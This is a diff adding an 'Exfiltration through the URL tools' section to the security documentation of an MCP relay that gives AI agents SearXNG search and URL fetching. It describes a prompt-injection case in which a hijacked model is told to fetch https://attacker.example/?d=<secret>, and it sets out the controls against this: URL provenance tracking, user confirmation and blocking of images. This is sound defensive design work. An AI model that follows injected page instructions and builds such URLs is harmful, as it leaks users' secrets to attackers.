@@ -6,6 +6,10 @@ The threats the relay is built against and the controls that answer them. Signed
 
 - [Prompt injection](#prompt-injection)
 - [Hidden-text removal](#hidden-text-removal)
+- [Exfiltration through the URL tools](#exfiltration-through-the-url-tools)
+  - [Where a URL came from](#where-a-url-came-from)
+  - [Trusted hosts](#trusted-hosts)
+  - [Images](#images)
 - [SSRF protection](#ssrf-protection)
   - [Reaching internal resources (opt-in)](#reaching-internal-resources-opt-in)
   - [Reaching resources through an egress proxy (opt-in)](#reaching-resources-through-an-egress-proxy-opt-in)
@@ -43,6 +47,49 @@ What this does not cover:
 - **Hiding through a stylesheet or a class** (`<p class="sr-only">`, a rule in a `<style>` block or an external `.css` file) cannot be detected without rendering the page in a browser engine, and the relay does not try. Only what an element says about itself is checked.
 - **Page metadata visitors never see** — `<meta name="description">`, Open Graph and similar tags, which `searxng_url_metadata` returns — is a separate channel that hidden-element removal does not touch. It gets the invisible-character filter, but otherwise it is unfiltered, page-supplied text and should be read as such.
 - **Visible text.** An instruction written in plain sight, or styled to be unreadable some other way (white on white, off-screen positioning, a tiny but non-zero font), is outside what these filters can decide.
+
+## Exfiltration through the URL tools
+
+The URL tools are a way out for data as well as a way in. A page that has taken over the model can tell it to read `https://attacker.example/?d=<secret>`, and the fetch delivers the secret to the attacker's server. No page can link to that address ready-made, because the page's author does not know the secret. The model has to build it. So the relay checks where an address came from, not only what it looks like.
+
+### Where a URL came from
+
+Every address the relay shows a caller goes into that caller's *seen set*: search result URLs, links in the text a read returned, metadata URLs, and the final URL after redirects. The set lives beside the [source history](tools.md#searxng_session_sources), keyed the same way (caller identity plus MCP session), and holds up to 2,000 addresses per caller, oldest dropped first. Addresses are compared after normalising case, default ports, trailing slashes, fragments and percent-encoding, so a URL the model copies with small cosmetic differences still matches.
+
+Before `searxng_read_url` or `searxng_url_metadata` fetches anything, the requested address is checked:
+
+| The address | `enforce` (default) | `strict` |
+|---|---|---|
+| was shown to this caller, or is on a [trusted host](#trusted-hosts) | fetched | fetched |
+| was not shown, and is plain | fetched and logged | the user is asked |
+| was not shown, and carries data | the user is asked | the user is asked |
+
+An address **carries data** when it has credentials (`user:pass@`), a query string, a path longer than 200 characters, or a host label or path segment that looks like a token: longer than 64 characters, or a run of 24 or more mixed letters and digits, as base64 or hex would be. Readable slugs such as `/how-to-configure-nginx` are plain.
+
+**Asking the user** uses MCP elicitation. The tool call returns an input-required result with the address and why it was flagged; the client shows the question, and retries the call with the answer. A "yes" is bound to this caller, this tool and this exact URL, can be redeemed once, and expires after 10 minutes; the address then joins the seen set. On a client that does not support elicitation there is no one to ask, so the fetch is refused, with a message telling the model to find the address through `searxng_web_search` or ask the user. Refusals are recorded in the caller's source history as not read.
+
+`FETCH_URL_PROVENANCE` picks the mode:
+
+- `enforce` (default): the table above.
+- `strict`: also ask about plain addresses that were not shown. This closes the slow route the heuristic leaves open, a model spelling a secret out over several short, plain-looking paths, at the cost of a question for every URL the user types in.
+- `log`: block nothing; log the fetches `enforce` would have asked about (`would_block`). Use it to measure the effect before turning enforcement on.
+- `off`: no check.
+
+An unknown value fails startup.
+
+The check runs inside the relay on every call, so a model that has been taken over cannot skip it. It does not cover search: a query is sent to SearXNG, not to an address the attacker chose. Queries holding a token-like word are counted in `mcp_search_queries_flagged_total` and logged, never refused.
+
+### Trusted hosts
+
+`FETCH_PROVENANCE_TRUSTED_HOSTS` lists hosts whose addresses are fetched without the check: your own wiki, an internal API the agent is expected to call with query strings, a docs site users paste links from. Entries are comma-separated host names, either exact (`wiki.example.com`) or a wildcard for subdomains (`*.example.com`). The wildcard matches `docs.example.com` and `a.b.example.com` but not `example.com` itself; list both if you want both. Entries are matched against the host only, case-insensitively, on any scheme or port. A scheme, port, path or `@` in an entry fails startup, so a pasted URL is caught rather than silently matching nothing.
+
+Trust a host only if no one outside your organisation can read what is sent to it. Any host on the list is one where data can leave in a query string with no one asked, so a public service that echoes or logs requests (a paste site, a URL shortener, a search engine) does not belong there.
+
+This list does not bypass [SSRF protection](#ssrf-protection). Reaching an internal host still needs `FETCH_ALLOWED_HOSTS` or `FETCH_ALLOWED_CIDRS`; the two lists answer different questions (*may the relay connect there?* and *may the model send data there unasked?*) and are set separately.
+
+### Images
+
+`searxng_read_url` refuses image responses unless `FETCH_ALLOW_IMAGES=true`. An image reaches a vision model as an image block, outside any fence, and a vision model reads instructions written inside a picture as readily as text. The refusal is decided from the response's content type (or, failing that, the URL's file extension) before the body is downloaded, and is counted as `reason="image_disabled"` in `mcp_fetch_errors_by_reason_total`. With images off, the tool's description and its `Accept` header no longer offer images. Turn it on for agents that need to look at pictures.
 
 ## SSRF protection
 
